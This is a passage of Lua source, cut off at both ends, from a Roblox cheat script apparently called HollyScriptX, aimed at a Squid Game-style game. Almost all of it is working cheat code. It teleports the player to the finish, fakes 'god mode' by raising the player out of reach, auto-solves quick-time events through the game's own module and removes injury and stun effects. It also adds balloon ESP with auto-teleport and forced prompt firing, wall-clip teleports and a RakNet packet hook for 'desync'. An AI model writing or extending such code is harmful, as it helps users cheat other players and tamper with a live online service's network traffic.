            Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
            Lighting.Ambient = Color3.fromRGB(255, 255, 255)
        end)
        
    else
        for property, value in pairs(MainModule.FullbrightSettings) do
            pcall(function()
                Lighting[property] = value
            end)
        end
        
        if MainModule.FullbrightConnection then
            MainModule.FullbrightConnection:Disconnect()
            MainModule.FullbrightConnection = nil
        end
    end
    PlayToggleSound()
end

MainModule.AutoCollectBandage = false
MainModule.AutoCollectBandageConnection = nil

function MainModule.HasTool(toolName)
    local char = MainModule.GetCharacter()
    if char then
        for _, tool in pairs(char:GetChildren()) do
            if tool:IsA("Tool") and tool.Name == toolName then
                return true
            end
        end
    end
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    if backpack then
        for _, tool in pairs(backpack:GetChildren()) do
            if tool:IsA("Tool") and tool.Name == toolName then
                return true
            end
        end
    end
    return false
end

function MainModule.StartAutoCollectBandage()
    if MainModule.AutoCollectBandageConnection then
        MainModule.AutoCollectBandageConnection:Disconnect()
        MainModule.AutoCollectBandageConnection = nil
    end
    
    MainModule.AutoCollectBandageConnection = RunService.Heartbeat:Connect(function()
        if not MainModule.AutoCollectBandage then return end
        
        if not MainModule.HasTool("Bandage") and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local effects = workspace:FindFirstChild("Effects")
            if effects then
                for _, v in pairs(effects:GetChildren()) do
                    if v.Name == "DroppedBandage" and v:FindFirstChild("Handle") then
                        local oldCFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
                        LocalPlayer.Character.HumanoidRootPart.CFrame = v.Handle.CFrame
                        task.wait(0.3)
                        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                            LocalPlayer.Character.HumanoidRootPart.CFrame = oldCFrame
                        end
                        break
                    end
                end
            end
        end
    end)
end

function MainModule.ToggleAutoCollectBandage(enabled)
    MainModule.AutoCollectBandage = enabled
    
    if enabled then
        MainModule.StartAutoCollectBandage()
    else
        if MainModule.AutoCollectBandageConnection then
            MainModule.AutoCollectBandageConnection:Disconnect()
            MainModule.AutoCollectBandageConnection = nil
        end
    end
    PlayToggleSound()
end

MainModule.RLGL_TP_End = function()
    if MainModule.IsGameActive("RedLightGreenLight") then
        MainModule.SafeTeleport(Vector3.new(110, 1023, 133))
        MainModule.Notify("RLGL","Teleported to End",0.9)
    else
        MainModule.Notify("RLGL","Wait for RedLightGreenLight!",0.9)
        PlayErrorSound()
    end
    PlayBell()
end

MainModule.GodModeEnabled = false
MainModule.GodModeConn = nil
MainModule.GodModeOrigY = nil

MainModule.ToggleGodMode = function(enabled)
    local toggleRef = ToggleRefs.GodMode
    
    if enabled then
        if not MainModule.CanEnableToggle("RedLightGreenLight", "God Mode", toggleRef) then
            return false
        end
    end
    
    if enabled then
        if MainModule.GodModeConn then MainModule.GodModeConn:Disconnect(); MainModule.GodModeConn = nil end
        MainModule.GodModeEnabled = true
        local c = MainModule.GetCharacter()
        if not c then MainModule.Notify("GodMode","Character not found",0.9); PlayErrorSound(); MainModule.GodModeEnabled=false; return false end
        local rp = c:FindFirstChild("HumanoidRootPart") or c.PrimaryPart
        if rp then
            MainModule.GodModeOrigY = rp.Position.Y
            MainModule.SafeTeleport(Vector3.new(rp.Position.X, rp.Position.Y+170, rp.Position.Z))
        end
        MainModule.GodModeConn = RunService.Heartbeat:Connect(function()
            if MainModule.GodModeEnabled and not MainModule.IsGameActive("RedLightGreenLight") then
                MainModule.DisableToggle("GodMode")
            end
        end)
    else
        MainModule.GodModeEnabled = false
        if MainModule.GodModeConn then MainModule.GodModeConn:Disconnect(); MainModule.GodModeConn = nil end
        if MainModule.GodModeOrigY then
            local c = MainModule.GetCharacter()
            if c then
                local rp = c:FindFirstChild("HumanoidRootPart")
                if rp then MainModule.SafeTeleport(Vector3.new(rp.Position.X, MainModule.GodModeOrigY, rp.Position.Z)) end
            end
        end
        MainModule.GodModeOrigY = nil
    end
    PlayToggleSound()
    return true
end

MainModule.RageAutoQTEEnabled = false
MainModule.RageAutoQTELoop = nil

MainModule.ToggleRageAutoQTE = function(enabled)
    local toggleRef = ToggleRefs.RageAutoQTE
    
    if enabled then
        if MainModule.IsXenoExecutor() then
            MainModule.Notify("RAGE Auto QTE", "Not supported in your executor", 0.9)
            PlayErrorSound()
            if toggleRef and toggleRef.SetValue then
                pcall(function() toggleRef:SetValue(false) end)
            end
            return false
        end
    end
    
    MainModule.RageAutoQTEEnabled = enabled
    
    if MainModule.RageAutoQTELoop then
        task.cancel(MainModule.RageAutoQTELoop)
        MainModule.RageAutoQTELoop = nil
    end
    
    if enabled then
        MainModule.RageAutoQTELoop = task.spawn(function()
            local QTE = nil
            local success, module = pcall(function()
                return require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("HBGQTE"))
            end)
            if success then
                QTE = module
            else
                MainModule.Notify("RAGE Auto QTE", "Failed to load QTE module", 0.9)
                PlayErrorSound()
                MainModule.RageAutoQTEEnabled = false
                if toggleRef and toggleRef.SetValue then
                    pcall(function() toggleRef:SetValue(false) end)
                end
                return
            end
            
            while MainModule.RageAutoQTEEnabled do
                task.wait(0.05)
                pcall(function()
                    if QTE and QTE.ActiveButtons then
                        for _, data in pairs(QTE.ActiveButtons) do
                            if data 
                            and data.Inner 
                            and data.Outer 
                            and not data.Inner:GetAttribute("Tweening") 
                            and not data.Inner:GetAttribute("Failed") then
                                pcall(function()
                                    QTE.Pressed(false, data)
                                end)
                            end
                        end
                    end
                end)
            end
        end)
        PlayBell()
    else
        PlayToggleSound()
    end
    return true
end

MainModule.RemoveInjuryObjects = function()
    local count = 0
    for _, obj in ipairs(workspace:GetDescendants()) do
        local name = obj.Name:lower()
        if name == "injuredwalking" or name == "stun" then
            pcall(function() obj:Destroy() end)
            count = count + 1
        end
    end
 --   MainModule.Notify("Remove Injury", "Removed " .. count .. " objects", 0.9)
    PlayBell()
end

MainModule.PhantomDashEnabled = false
MainModule.PhantomDashKeybind = Enum.KeyCode.Q
MainModule.PhantomDashDistance = 15
MainModule.PhantomDashDuration = 0.25
MainModule.PhantomDashCooldown = 1
MainModule.PhantomDashMaxCharges = 2
MainModule.PhantomDashCurrentCharges = 2
MainModule.PhantomDashIsMoving = false
MainModule.PhantomDashSoundId = "rbxassetid://94904871279766"
MainModule.PhantomDashBackwardSoundId = "rbxassetid://99068532205349"
MainModule.PhantomDashTextures = {
    "http://www.roblox.com/asset/?id=122158926856615",
    "http://www.roblox.com/asset/?id=14005913529",
    "http://www.roblox.com/asset/?id=17888919056",
    "http://www.roblox.com/asset/?id=14695179076",
    "http://www.roblox.com/asset/?id=15431126240",
    "http://www.roblox.com/asset/?id=14045123768"
}
MainModule.PhantomDashConnection = nil
MainModule.PhantomDashKeybindConnection = nil
MainModule.PhantomDashMobileGui = nil
MainModule.PhantomDashRechargeThread = nil

local function createDiagonalClusterTrail(parent)
    local createdEmitters = {}

    for index, textureId in ipairs(MainModule.PhantomDashTextures) do
        local emitter = Instance.new("ParticleEmitter")
        emitter.Name = "DashDiagonalCluster_" .. index
        emitter.Texture = textureId
        
        emitter.Color = ColorSequence.new(Color3.new(0, 0, 0))
        emitter.LightEmission = 0
        emitter.LightInfluence = 0
        emitter.Brightness = 1
        
        emitter.LockedToPart = false
        emitter.Orientation = Enum.ParticleOrientation.FacingCamera
        
        emitter.Rotation = NumberRange.new(45, 45)
        emitter.RotSpeed = NumberRange.new(0, 0)
        
        emitter.Speed = NumberRange.new(1, 5)
        emitter.SpreadAngle = Vector2.new(20, 20)
        emitter.Lifetime = NumberRange.new(0.3, 0.6)
        emitter.ZOffset = 1
        
        emitter.Size = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 3.5),
            NumberSequenceKeypoint.new(0.5, 6),
            NumberSequenceKeypoint.new(1, 0)
        })
        
        emitter.Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0),
            NumberSequenceKeypoint.new(0.6, 0.4),
            NumberSequenceKeypoint.new(1, 1)
        })

        emitter.Parent = parent
        table.insert(createdEmitters, emitter)
    end

    return createdEmitters
end

local function startRecharge()
    if MainModule.PhantomDashRechargeThread then
        task.cancel(MainModule.PhantomDashRechargeThread)
    end
    
    MainModule.PhantomDashRechargeThread = task.spawn(function()
        while MainModule.PhantomDashCurrentCharges < MainModule.PhantomDashMaxCharges do
            task.wait(MainModule.PhantomDashCooldown)
            MainModule.PhantomDashCurrentCharges = math.min(MainModule.PhantomDashMaxCharges, MainModule.PhantomDashCurrentCharges + 1)
        end
        MainModule.PhantomDashRechargeThread = nil
    end)
end

local function doPhantomDash()
    if MainModule.PhantomDashIsMoving or MainModule.PhantomDashCurrentCharges <= 0 then return end

    local character = MainModule.GetCharacter()
    if not character then return end
    local hrp = MainModule.GetRootPart(character)
    local humanoid = MainModule.GetHumanoid(character)
    if not hrp or not humanoid then return end

    MainModule.PhantomDashIsMoving = true
    
    local shouldStartRecharge = (MainModule.PhantomDashCurrentCharges == MainModule.PhantomDashMaxCharges)
    MainModule.PhantomDashCurrentCharges = MainModule.PhantomDashCurrentCharges - 1

    if shouldStartRecharge then
        startRecharge()
    end

    local moveDir = humanoid.MoveDirection
    local isMovingBackward = false
    local dashDirectionVector = hrp.CFrame.LookVector

    if moveDir.Magnitude > 0 then
        local dot = moveDir:Dot(hrp.CFrame.LookVector)
        if dot < -0.2 or UserInputService:IsKeyDown(Enum.KeyCode.S) then
            isMovingBackward = true
            dashDirectionVector = -hrp.CFrame.LookVector
        else
            dashDirectionVector = moveDir
        end
    elseif UserInputService:IsKeyDown(Enum.KeyCode.S) then
        isMovingBackward = true
        dashDirectionVector = -hrp.CFrame.LookVector
    end

    local soundToPlay = isMovingBackward and MainModule.PhantomDashBackwardSoundId or MainModule.PhantomDashSoundId

    local sound = Instance.new("Sound")
    sound.SoundId = soundToPlay
    sound.Volume = 1.5
    sound.Parent = hrp
    sound:Play()
    task.delay(3, function() sound:Destroy() end)

    local emitters = createDiagonalClusterTrail(hrp)
    for _, emitter in ipairs(emitters) do
        emitter.Rate = 110
        emitter.Enabled = true
    end

    local targetCFrame = hrp.CFrame + (dashDirectionVector * MainModule.PhantomDashDistance)
    local tweenInfo = TweenInfo.new(MainModule.PhantomDashDuration, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local tween = TweenService:Create(hrp, tweenInfo, {CFrame = targetCFrame})

    tween:Play()

    task.wait(MainModule.PhantomDashDuration)

    for _, emitter in ipairs(emitters) do
        emitter.Enabled = false
        task.delay(1.2, function() emitter:Destroy() end)
    end

    MainModule.PhantomDashIsMoving = false
end

local function createMobilePhantomDashButton()
    if MainModule.PhantomDashMobileGui then
        MainModule.PhantomDashMobileGui:Destroy()
        MainModule.PhantomDashMobileGui = nil
    end

    local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
    if not playerGui then return end

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "PhantomDashGui"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = playerGui

    local dashButton = Instance.new("TextButton")
    dashButton.Name = "PhantomDashButton"
    dashButton.Size = UDim2.new(0, 70, 0, 70)
    dashButton.Position = UDim2.new(0.8, -35, 0.6, -35)
    dashButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    dashButton.Text = "Dash"
    dashButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    dashButton.Font = Enum.Font.GothamBold
    dashButton.TextSize = 16
    dashButton.Active = true
    dashButton.Parent = screenGui

    local uiCorner = Instance.new("UICorner")
    uiCorner.CornerRadius = UDim.new(0, 12)
    uiCorner.Parent = dashButton

    local uiStroke = Instance.new("UIStroke")
    uiStroke.Thickness = 2
    uiStroke.Color = Color3.fromRGB(0, 0, 0)
    uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
    uiStroke.Parent = dashButton

    local dragging = false
    local dragStart, startPos
    local hasMoved = false

    dashButton.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            hasMoved = false
            dragStart = input.Position
            startPos = dashButton.Position

            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    dashButton.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseMovement) then
            local delta = input.Position - dragStart
            if delta.Magnitude > 5 then
                hasMoved = true
            end
            dashButton.Position = UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale,
                startPos.Y.Offset + delta.Y
            )
        end
    end)

    dashButton.MouseButton1Click:Connect(function()
        if not hasMoved then
            doPhantomDash()
        end
    end)

    MainModule.PhantomDashMobileGui = screenGui
end

function MainModule.TogglePhantomDash(enabled)
    MainModule.PhantomDashEnabled = enabled

    if MainModule.PhantomDashConnection then
        MainModule.PhantomDashConnection:Disconnect()
        MainModule.PhantomDashConnection = nil
    end

    if MainModule.PhantomDashKeybindConnection then
        MainModule.PhantomDashKeybindConnection:Disconnect()
        MainModule.PhantomDashKeybindConnection = nil
    end

    if MainModule.PhantomDashMobileGui then
        MainModule.PhantomDashMobileGui:Destroy()
        MainModule.PhantomDashMobileGui = nil
    end

    if MainModule.PhantomDashRechargeThread then
        task.cancel(MainModule.PhantomDashRechargeThread)
        MainModule.PhantomDashRechargeThread = nil
    end

    MainModule.PhantomDashCurrentCharges = MainModule.PhantomDashMaxCharges
    MainModule.PhantomDashIsMoving = false

    if enabled then
        if MainModule.IsMobile() then
            createMobilePhantomDashButton()
        else
            MainModule.PhantomDashKeybindConnection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
                if gameProcessed then return end
                if input.KeyCode == MainModule.PhantomDashKeybind then
                    doPhantomDash()
                end
            end)
        end
    end

    PlayToggleSound()
end

function MainModule.SetPhantomDashKeybind(keycode)
    MainModule.PhantomDashKeybind = keycode
end

function MainModule.SetPhantomDashDistance(value)
    MainModule.PhantomDashDistance = value
end

function MainModule.SetPhantomDashDuration(value)
    MainModule.PhantomDashDuration = value / 100
end

function MainModule.SetPhantomDashCooldown(value)
    MainModule.PhantomDashCooldown = value
end

function MainModule.SetPhantomDashMaxCharges(value)
    MainModule.PhantomDashMaxCharges = value
    MainModule.PhantomDashCurrentCharges = value
end


MainModule.RLGLEnabled = false
MainModule.RLGLConnection = nil
MainModule.RLGLOriginalWalkSpeed = 16
MainModule.RLGLOriginalJumpPower = 50
MainModule.RLGLOriginalJumpHeight = 7.2
MainModule.RLGLWasFrozen = false
MainModule.RLGLRedLightAnimId = "rbxassetid://73083130944511"


local pointA = Vector3.new(-215, 1023, -513)
local pointB = Vector3.new(116, 1023, 82)

local minX = math.min(pointA.X, pointB.X)
local maxX = math.max(pointA.X, pointB.X)

local minY = math.min(pointA.Y, pointB.Y) - 50
local maxY = math.max(pointA.Y, pointB.Y) + 50

local minZ = math.min(pointA.Z, pointB.Z)
local maxZ = math.max(pointA.Z, pointB.Z)

pcall(function()
    local anim = ReplicatedStorage:FindFirstChild("Animations")
        and ReplicatedStorage.Animations:FindFirstChild("Games")
        and ReplicatedStorage.Animations.Games:FindFirstChild("RedLightGreenLight")
        and ReplicatedStorage.Animations.Games.RedLightGreenLight:FindFirstChild("RedLightTurn")
    if anim and anim:IsA("Animation") then
        MainModule.RLGLRedLightAnimId = anim.AnimationId
    end
end)

local function getHumanoid()
    local char = LocalPlayer.Character
    return char and char:FindFirstChildOfClass("Humanoid")
end

local function getHRP()
    local char = LocalPlayer.Character
    return char and char:FindFirstChild("HumanoidRootPart")
end

local function isPlayerInZone()
    local hrp = getHRP()
    if not hrp then return false end
    
    local pos = hrp.Position
    return (pos.X >= minX and pos.X <= maxX)
       and (pos.Y >= minY and pos.Y <= maxY)
       and (pos.Z >= minZ and pos.Z <= maxZ)
end


local cachedAnimators = {}
local lastCacheTime = 0

local function updateAnimatorCache()
    local currentTime = tick()
    if currentTime - lastCacheTime < 1 then return end
    lastCacheTime = currentTime

    table.clear(cachedAnimators)
    for _, obj in ipairs(Workspace:GetDescendants()) do
        if obj:IsA("Animator") then
            table.insert(cachedAnimators, obj)
        end
    end
end

local function isRedLightActive()
    updateAnimatorCache()

    for i = #cachedAnimators, 1, -1 do
        local animator = cachedAnimators[i]
        if not animator or not animator.Parent then
            table.remove(cachedAnimators, i)
        else
            for _, track in ipairs(animator:GetPlayingAnimationTracks()) do
                if track.Animation then
                    local animId = tostring(track.Animation.AnimationId)
                    if animId == MainModule.RLGLRedLightAnimId or animId:find("73083130944511") or animId:find("123441836092792") then
                        return true
                    end
                end
            end
        end
    end
    return false
end


local function freezePlayer()
    local humanoid = getHumanoid()
    local hrp = getHRP()
    if not humanoid then return end

    if not MainModule.RLGLWasFrozen then
        MainModule.RLGLOriginalWalkSpeed = humanoid.WalkSpeed
        MainModule.RLGLOriginalJumpPower = humanoid.JumpPower
        MainModule.RLGLOriginalJumpHeight = humanoid.JumpHeight
        MainModule.RLGLWasFrozen = true
    end


    humanoid:Move(Vector3.new(0, 0, 0), false)
    
   
    if hrp then
        hrp.AssemblyLinearVelocity = Vector3.new(0, hrp.AssemblyLinearVelocity.Y, 0)
        hrp.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
    end

    humanoid.WalkSpeed = 0
    humanoid.JumpPower = 0
    humanoid.JumpHeight = 0
end

local function unfreezePlayer()
    local humanoid = getHumanoid()
    if not humanoid then return end

    humanoid.WalkSpeed = MainModule.RLGLOriginalWalkSpeed > 0 and MainModule.RLGLOriginalWalkSpeed or 16
    humanoid.JumpPower = MainModule.RLGLOriginalJumpPower > 0 and MainModule.RLGLOriginalJumpPower or 50
    humanoid.JumpHeight = MainModule.RLGLOriginalJumpHeight > 0 and MainModule.RLGLOriginalJumpHeight or 7.2

    MainModule.RLGLWasFrozen = false
end

function MainModule.ToggleRLGLStop(enabled)
    MainModule.RLGLEnabled = enabled
    
    if MainModule.RLGLConnection then
        MainModule.RLGLConnection:Disconnect()
        MainModule.RLGLConnection = nil
    end
    
    if enabled then
        MainModule.RLGLConnection = RunService.Heartbeat:Connect(function()
            if not MainModule.RLGLEnabled then return end
            
            if isPlayerInZone() and isRedLightActive() then
                freezePlayer()
            else
                if MainModule.RLGLWasFrozen then
                    unfreezePlayer()
                end
            end
        end)
    else
        if MainModule.RLGLWasFrozen then
            unfreezePlayer()
        end
    end
    if PlayToggleSound then
        PlayToggleSound()
    end
end

MainModule.TugOfWarQTEMode = false
MainModule.TugOfWarQTEConnection = nil
MainModule.TugOfWarQTEUI = nil

local qte = require(ReplicatedStorage.Modules.HBGQTE)

local function findTugOfWarUI()
    local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
    if not playerGui then return nil end
    
    local ui = playerGui:FindFirstChild("TugOfWarUIV2") 
        or playerGui:FindFirstChild("TugOfWarUI")
        or playerGui:FindFirstChild("TugofWarRemake")
    
    if ui then return ui end
    
    local storage = ReplicatedStorage:FindFirstChild("UI")
    if storage then
        ui = storage:FindFirstChild("TugOfWarUIV2") 
            or storage:FindFirstChild("TugOfWarUI")
        if ui then
            local clone = ui:Clone()
            clone.Parent = playerGui
            return clone
        end
    end
    
    return nil
end

function MainModule.ToggleTugOfWarQTE(enabled)
    MainModule.TugOfWarQTEMode = enabled
    
    if MainModule.TugOfWarQTEConnection then
        MainModule.TugOfWarQTEConnection:Disconnect()
        MainModule.TugOfWarQTEConnection = nil
    end
    
    if MainModule.TugOfWarQTEUI then
        MainModule.TugOfWarQTEUI:Destroy()
        MainModule.TugOfWarQTEUI = nil
    end
    
    if enabled then
        LocalPlayer:SetAttribute("TugOfWarPhase", "QTE")
        workspace:SetAttribute("TugOfWarRhythmGoal", 180)
        workspace:SetAttribute("TugOfWarRush", nil)
        
        local ui = findTugOfWarUI()
        if ui then
            ui.Enabled = true
            MainModule.TugOfWarQTEUI = ui
            
            local handler = ui:FindFirstChild("TugOfWarQTEHandler", true)
                or ui:FindFirstChildWhichIsA("LocalScript", true)
                or ui:FindFirstChildWhichIsA("Script", true)
            
            if handler and handler:IsA("LocalScript") then
                handler.Disabled = false
            end
        end
        
        task.wait(0.3)
        LocalPlayer:SetAttribute("TugOfWarPhase", "QTE")
        
        MainModule.Notify("Tug of War", "QTE Mode Enabled", 0.9)
    else
        MainModule.Notify("Tug of War", "QTE Mode Disabled", 0.9)
    end
    
    PlayToggleSound()
end

local qteButtonsRunning = false
local qteButtonsTask = nil

local function StopQTEButtons()
    qteButtonsRunning = false
    if qteButtonsTask then
        task.cancel(qteButtonsTask)
        qteButtonsTask = nil
    end
end

local function StartQTEButtons()
    StopQTEButtons()
    
    local letters = ToggleRefs.QTELettersInput and ToggleRefs.QTELettersInput.Value or "WASD"
    local speed = ToggleRefs.QTESpeedSlider and ToggleRefs.QTESpeedSlider.Value or 0.5
    
    local filtered = {}
    for i = 1, #letters do
        local char = letters:sub(i, i):upper()
        if char:match("[A-Z]") then
            filtered[#filtered + 1] = char
        end
    end
    
    if #filtered == 0 then
        Library:Notify({Title = "QTE Buttons", Description = "No valid letters entered", Duration = 0.9})
        return
    end
    
    qteButtonsRunning = true
    
    qteButtonsTask = task.spawn(function()
        local index = 1
        while qteButtonsRunning do
            local key = filtered[index]
            pcall(function()
                qte.SetUpButton(3, key, false, nil)
            end)
            index = index % #filtered + 1
            task.wait(speed)
        end
    end)
end

MainModule.BalloonData = {

    ESPEnabled = false,

    TPEnabled = false,

    Tracers = {},

    Highlights = {},

    NotifiedBalloons = {},

    ProcessedPrompts = {}

}



local function firePromptExecutor(prompt)

    if not prompt or not prompt:IsA("ProximityPrompt") then return end

    

    if fireproximityprompt then

        pcall(function() fireproximityprompt(prompt) end)

    elseif syn and syn.proximityprompt then

        pcall(function() syn.proximityprompt(prompt) end)

    else

        local originalDuration = prompt.HoldDuration

        prompt.HoldDuration = 0

        pcall(function()

            prompt:InputHoldBegin()

            task.wait()

            prompt:InputHoldEnd()

        end)

        prompt.HoldDuration = originalDuration

    end

end




function MainModule.ToggleBalloonTeleport(enabled)
    MainModule.BalloonData.TPEnabled = enabled
end


task.spawn(function()
    while task.wait(0.1) do
    
        if MainModule.BalloonData.TPEnabled then
            local effects = workspace:FindFirstChild("Effects")
            if effects then
                for _, balloon in ipairs(effects:GetChildren()) do
                    if balloon.Name == "Balloon" and not MainModule.BalloonData.ProcessedPrompts[balloon] then
                        
                        local prompt = balloon:FindFirstChild("BalloonProximityPrompt", true) or balloon:FindFirstChildWhichIsA("ProximityPrompt", true)
                        
                        if prompt then
                            MainModule.BalloonData.ProcessedPrompts[balloon] = true
                            
                            task.spawn(function()
                                task.wait(0.1)
                                
                                if balloon and balloon.Parent and MainModule.BalloonData.TPEnabled then
                                    local targetPart = prompt.Parent:IsA("BasePart") and prompt.Parent or balloon:FindFirstChildWhichIsA("BasePart", true)
                                    local char = MainModule.GetCharacter()
                                    local hrp = char and MainModule.GetRootPart(char)
                                    
                                    if char and hrp and targetPart then
                                 
                                        char:PivotTo(targetPart.CFrame * CFrame.new(0, 5, 0))
                                        task.wait(0.15)
                                        
                            
                                        firePromptExecutor(prompt)
                                    end
                                end
                            end)
                        end
                    end
                end
            end
        end
    end
end)




function MainModule.CreateESPVisuals(balloon)

    local targetPart = balloon:IsA("BasePart") and balloon or balloon:FindFirstChildWhichIsA("BasePart", true)

    if not targetPart then return end



    if not MainModule.BalloonData.NotifiedBalloons[balloon] then

        MainModule.BalloonData.NotifiedBalloons[balloon] = true

        if Library and Library.Notify then

            Library:Notify({Title = "HollyScriptX", Description = "Balloon detected!", Duration = 0.9})

        end

        if PlayErrorSound then PlayErrorSound() end

    end





    if not MainModule.BalloonData.Highlights[balloon] then

        local highlight = Instance.new("Highlight")

        highlight.Name = "BalloonHighlight"

        highlight.Adornee = balloon

        highlight.FillColor = Color3.fromRGB(255, 255, 255)

        highlight.OutlineColor = Color3.fromRGB(255, 255, 255)

        highlight.FillTransparency = 0.5

        highlight.OutlineTransparency = 0

        highlight.Parent = balloon

        

        MainModule.BalloonData.Highlights[balloon] = highlight

    end





    local char = MainModule.GetCharacter()

    if char then

        local hrp = MainModule.GetRootPart(char)

        if hrp and not MainModule.BalloonData.Tracers[targetPart] then

            local a0 = Instance.new("Attachment", hrp)

            a0.Name = "BalloonTracerA0"

            

            local a1 = Instance.new("Attachment", targetPart)

            a1.Name = "BalloonTracerA1"

            

            local beam = Instance.new("Beam")

            beam.Name = "BalloonTracerBeam"

            beam.Color = ColorSequence.new(Color3.fromRGB(255, 255, 255))

            beam.Width0 = 0.15

            beam.Width1 = 0.15

            beam.FaceCamera = true

            beam.Attachment0 = a0

            beam.Attachment1 = a1

            beam.Parent = targetPart

            

            MainModule.BalloonData.Tracers[targetPart] = {

                Attachment0 = a0,

                Attachment1 = a1,

                Beam = beam

            }

        end

    end





    balloon.AncestryChanged:Connect(function(_, parent)

        if not parent then

            MainModule.BalloonData.NotifiedBalloons[balloon] = nil

            MainModule.BalloonData.ProcessedPrompts[balloon] = nil

            

            if MainModule.BalloonData.Highlights[balloon] then

                pcall(function() MainModule.BalloonData.Highlights[balloon]:Destroy() end)

                MainModule.BalloonData.Highlights[balloon] = nil

            end

            if MainModule.BalloonData.Tracers[targetPart] then

                pcall(function()

                    MainModule.BalloonData.Tracers[targetPart].Attachment0:Destroy()

                    MainModule.BalloonData.Tracers[targetPart].Attachment1:Destroy()

                    MainModule.BalloonData.Tracers[targetPart].Beam:Destroy()

                end)

                MainModule.BalloonData.Tracers[targetPart] = nil

            end

        end

    end)

end



function MainModule.ToggleBalloonESP(enabled)

    MainModule.BalloonData.ESPEnabled = enabled



    if not enabled then



        for balloon, hl in pairs(MainModule.BalloonData.Highlights) do

            pcall(function() hl:Destroy() end)

        end

        for _, data in pairs(MainModule.BalloonData.Tracers) do

            pcall(function()

                data.Attachment0:Destroy()

                data.Attachment1:Destroy()

                data.Beam:Destroy()

            end)

        end

        MainModule.BalloonData.Highlights = {}

        MainModule.BalloonData.Tracers = {}

        MainModule.BalloonData.NotifiedBalloons = {}

    end

end





task.spawn(function()

    while task.wait(0.5) do

        if MainModule.BalloonData.ESPEnabled then

            local effects = workspace:FindFirstChild("Effects")

            if effects then

                for _, child in ipairs(effects:GetChildren()) do

                    if child.Name == "Balloon" then

                        MainModule.CreateESPVisuals(child)

                    end

                end

            end

        end

    end

end)

MainModule.noclipEnabled = false
MainModule.noclipButton = nil
MainModule.noclipConnection = nil
MainModule.TELEPORT_DISTANCE = 13
MainModule.RAY_LENGTH = 6

MainModule.createNoclipButton = function()
    if MainModule.noclipButton then MainModule.noclipButton:Destroy() end
    
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "NoclipButton"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0, 80, 0, 80)
    button.Position = UDim2.new(1, -100, 0, 100)
    button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    button.BackgroundTransparency = 0.5
    button.Text = "Teleport"
    button.TextColor3 = Color3.new(1, 1, 1)
    button.TextSize = 20
    button.Font = Enum.Font.GothamBold
    button.Parent = screenGui
    
    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(255, 255, 255)
    stroke.Thickness = 2
    stroke.Parent = button
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = button
    
    local dragging = false
    local dragStart = nil
    local startPos = nil
    
    button.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = button.Position
        end
    end)
    
    button.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.Touch then
            local delta = input.Position - dragStart
            button.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    
    button.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)
    
    button.MouseButton1Click:Connect(function()
        MainModule.teleportThroughWall()
    end)
    
    MainModule.noclipButton = screenGui
    return screenGui
end

MainModule.teleportThroughWall = function()
    if not MainModule.noclipEnabled then return end
    local char = LocalPlayer.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local cam = workspace.CurrentCamera
    if not cam then return end
    local direction = cam.CFrame.LookVector
    local origin = root.Position
    local rayParams = RaycastParams.new()
    rayParams.FilterType = Enum.RaycastFilterType.Blacklist
    rayParams.FilterDescendantsInstances = {char}
    rayParams.IgnoreWater = true
    local rayResult = workspace:Raycast(origin, direction * MainModule.RAY_LENGTH, rayParams)
    local targetPos = origin + (direction * MainModule.TELEPORT_DISTANCE)
    if rayResult then
        local hitPos = rayResult.Position
        local normal = rayResult.Normal
        targetPos = hitPos + (direction * 3) + (normal * 2)
    end
    root.CanCollide = false
    root.CFrame = CFrame.new(targetPos)
    task.wait()
    root.CanCollide = true
end

MainModule.desyncHooked = false
MainModule.desyncAvailable = pcall(function() return raknet and raknet.add_send_hook end)

MainModule.rakhook = function(packet)
    if packet.PacketId == 0x1B then
        local buf = packet.AsBuffer
        if buffer and buffer.writeu32 then
            buffer.writeu32(buf, 1, 0xFFFFFFFF)
            packet:SetData(buf)
        end
    end
end

MainModule.ToggleDesync = function(enabled)
    local toggleRef = ToggleRefs.Desync
    
    if enabled and MainModule.IsXenoExecutor() then
        MainModule.Notify("Desync", "Not supported in your executor", 0.9)
        PlayErrorSound()
        if toggleRef and toggleRef.SetValue then
            pcall(function() toggleRef:SetValue(false) end)
        end
        return false
    end
    if not MainModule.desyncAvailable then
